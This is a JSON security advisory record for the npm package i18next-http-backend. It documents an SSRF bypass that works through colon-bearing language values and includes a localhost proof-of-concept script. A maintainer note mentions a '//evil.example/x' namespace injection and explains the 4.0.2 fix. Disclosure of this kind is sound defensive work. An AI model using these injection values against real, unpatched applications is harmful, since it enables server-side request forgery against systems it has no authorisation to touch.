@@ -1,0 +1,59 @@
+{
+  "Severity": "LOW",
+  "UpdatedAt": "2026-10-06T15:33:34Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "i18next-http-backend"
+  },
+  "Advisory": {
+    "DatabaseId": 507063,
+    "Id": "GSA_kwCzR0hTQS14dnE5LXdqcDgtaHdxZs4AB7y3",
+    "GhsaId": "GHSA-xvq9-wjp8-hwqf",
+    "References": [
+      {
+        "Url": "https://github.com/i18next/i18next-http-backend/security/advisories/GHSA-xvq9-wjp8-hwqf"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-105800"
+      },
+      {
+        "Url": "https://github.com/i18next/i18next-http-backend/commit/07e028862b25d0b9251bf3cafb92be2d35285f85"
+      },
+      {
+        "Url": "https://github.com/i18next/i18next-http-backend/releases/tag/v4.0.2"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-xvq9-wjp8-hwqf"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-xvq9-wjp8-hwqf"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-105800"
+      }
+    ],
+    "Description": "There is an SSRF vulnerability when using `i18next-http-backend`. A colon in an attacker-controlled language value can make a custom path template request an unintended origin.\n\nThis is reachable under the following conditions: Attacker controls i18next language or namespace input that is interpolated into loadPath.\n\n## Proof of Concept\n\n```js\n// SSRF through a colon-only URL scheme in i18next-http-backend interpolation.\nconst http = require(\"node:http\");\nconst Backend = require(\"i18next-http-backend\");\n\nfunction read(backend, lng, ns) {\n  return new Promise((resolve) =\u003e {\n    backend.read(lng, ns, (err) =\u003e resolve(err));\n  });\n}\n\nasync function main() {\n  let gotRequest = false;\n  const server = http.createServer((req, res) =\u003e {\n    gotRequest = req.url === \"/common.json\";\n    res.writeHead(200, { \"content-type\": \"application/json\" });\n    res.end(\"{}\");\n  });\n\n  await new Promise((resolve) =\u003e server.listen(0, \"127.0.0.1\", resolve));\n  const backend = new Backend(null, { loadPath: \"{{lng}}/{{ns}}.json\" });\n  const lng = `http:127.0.0.1:${server.address().port}`;\n\n  const err = await read(backend, lng, \"common\");\n  server.close();\n\n  const vulnerable = gotRequest \u0026\u0026 !err;\n  console.log(vulnerable ? \"VULNERABLE\" : \"SAFE\");\n  if (!vulnerable) process.exitCode = 1;\n}\n\nmain();\n```\n\nRun:\n\n```bash\nnpm install --ignore-scripts\nnode poc.js\n```\n\nThe expected result is:\n\n```text\nVULNERABLE\n```\n\n## Why the Previous Patch Was Incomplete\n\nThis vulnerability is caused by an incomplete patch for [CVE-2026-41691](https://github.com/advisories/GHSA-q89c-q3h5-w34g). The previous patch addressed the following behavior: Original hardening blocks path traversal and selected URL-control characters in lng/ns.\n\nThe following bypass remains in the current release: lng=http:127.0.0.1:\u003cport\u003e with loadPath={{lng}}/{{ns}}.json; colon is not blocked and produces an outbound request.\n\n## Impact\n\nThe attacker-controlled language or namespace value can redirect the backend request to an unintended origin, resulting in URL injection and possible SSRF.\n\n## Recommended Fix\n\nParse the final URL and require it to remain within the intended origin and path. If absolute URLs are supported, validate them against an explicit allowlist.\n\nPlease let us know if you need any additional information or clarification. We are happy to prepare a pull request if that would be helpful. Thank you for reviewing this report.\n\n## Maintainer note\n\nConfirmed and fixed in 4.0.2 (commit i18next/i18next-http-backend@07e0288).\n\n**Preconditions.** The bypass only works when the `loadPath` / `addPath` template *begins* directly with `{{lng}}` or `{{ns}}` — no origin and no leading `/`, e.g. `{{lng}}/{{ns}}.json`. Only in that position is `http:` parsed as a URL scheme. The default `/locales/{{lng}}/{{ns}}.json` and every template with a leading path or origin are **not** affected: a colon inside a path segment has no structural meaning there, and the resulting string is rejected as an invalid URL. The same template shape also allowed an `ns` value such as `//evil.example/x` to become a protocol-relative URL in browsers.\n\n**Fix.** `:` is now rejected in both `lng` and `ns` values, and `//` in `ns` values. No BCP-47 language code contains a colon, and `:` is i18next's default namespace separator, so no usable namespace name does either.\n\n**Affected range.** Versions before 3.0.5 had no validation at all and are reachable through this vector too, so the affected range is `\u003c 4.0.2` rather than `\u003e= 3.0.5, \u003c= 4.0.1`.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-10-06T15:33:33Z",
+    "Severity": "LOW",
+    "Summary": "i18next-http-backend incomplete URL validation permits SSRF",
+    "UpdatedAt": "2026-10-06T15:33:34Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 3.7,
+      "VectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "4.0.2"
+      },
+      "VulnerableVersionRange": "\u003c 4.0.2"
+    }
+  ]
+}
